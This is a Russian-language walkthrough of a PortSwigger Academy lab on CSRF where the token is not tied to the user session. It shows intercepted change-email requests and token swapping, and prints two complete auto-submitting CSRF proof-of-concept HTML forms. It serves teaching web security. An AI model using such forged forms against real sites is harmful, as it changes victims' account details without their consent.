Перейдем на уязвимый ресурс и залогинимся под `wiener:peter`

включим режим `proxy` -> `intercept is on `
и изменим почтовый ящик на `2@2.com`

мы получим запрос 
```
POST /my-account/change-email HTTP/2
...
email=2%402.com&csrf=REvmaPogUDXqGvN0V18evH746qLVkxxo
```
который мы отравим в `Repeater`, а сам запрос дропнем
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/4.%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/pics%20for%20walkthrough/1.png)
Далее откроем в `режиме инкогнито` другую вкладку чтобы не разлогинится с прошлым пользователем, включим режим `intercept`, залогинимся под `carlos:montoya`
и изменим почту на `123@123`

и отправим этот запрос в `Repeater`
```
POST /my-account/change-email HTTP/2
...
email=123%40123&csrf=9tQhOzDXs1myXntysHnGboUxaaMeCDnk
```
и дропнем данный запрос
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/4.%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/pics%20for%20walkthrough/2.png)

На следующем шаге перейдем в Repeater и возьмем csrf-токен wiener'a и поставим его в запрос #2 - carlos'a
Дело в том, что некоторые приложения не проверяют принадлежность токена к тому же сеансу, что и пользователь, делающий запрос. Вместо этого приложение поддерживает глобальный пул выпущенных им токенов и принимает любой токен, который появляется в этом пуле.

В этой ситуации злоумышленник может войти в приложение под своей учетной записью, получить действительный токен и затем передать его пользователю-жертве в ходе атаки CSRF.


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/4.%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/pics%20for%20walkthrough/3.png)

как видим, хоть csrf токен был и другой, все равно произошло изменение почты на `123@123` у УЗ `carlos`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/4.%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/pics%20for%20walkthrough/4.png)


Далее сгенерируем PoC как в прошлых лабораторных работах выбрав запрос на изменение почты и нажав `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC`
и получим следующий результат
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a01005104009a8e81b8a80800140031.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="123&#64;123" />
      <input type="hidden" name="csrf" value="9tQhOzDXs1myXntysHnGboUxaaMeCDnk" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/4.%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/pics%20for%20walkthrough/6.png)
Так как csrf-токен одноразовый вернемся на прошлую страничку и под УЗ `wiener`, включим `intercept`
```
POST /my-account/change-email HTTP/2
...
email=qq%40qq&csrf=mNKffyBwBfhWbFwgh04wPdincP2if1Xe
```
и дропнем данный пакет

Получив новый csrf Токен изменим ранее сгенерированный нами PoC, заменив там csrf токен с `9tQhOzDXs1myXntysHnGboUxaaMeCDnk` на `mNKffyBwBfhWbFwgh04wPdincP2if1Xe`, а так же изменим почтовый ящик с `123@123` на `1234@123`
и перепишем это в новый PoC

```

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a01005104009a8e81b8a80800140031.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="1234&#64;123" />
      <input type="hidden" name="csrf" value="mNKffyBwBfhWbFwgh04wPdincP2if1Xe" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Нажмем `Store` а далее `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/4.%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/pics%20for%20walkthrough/7.png)
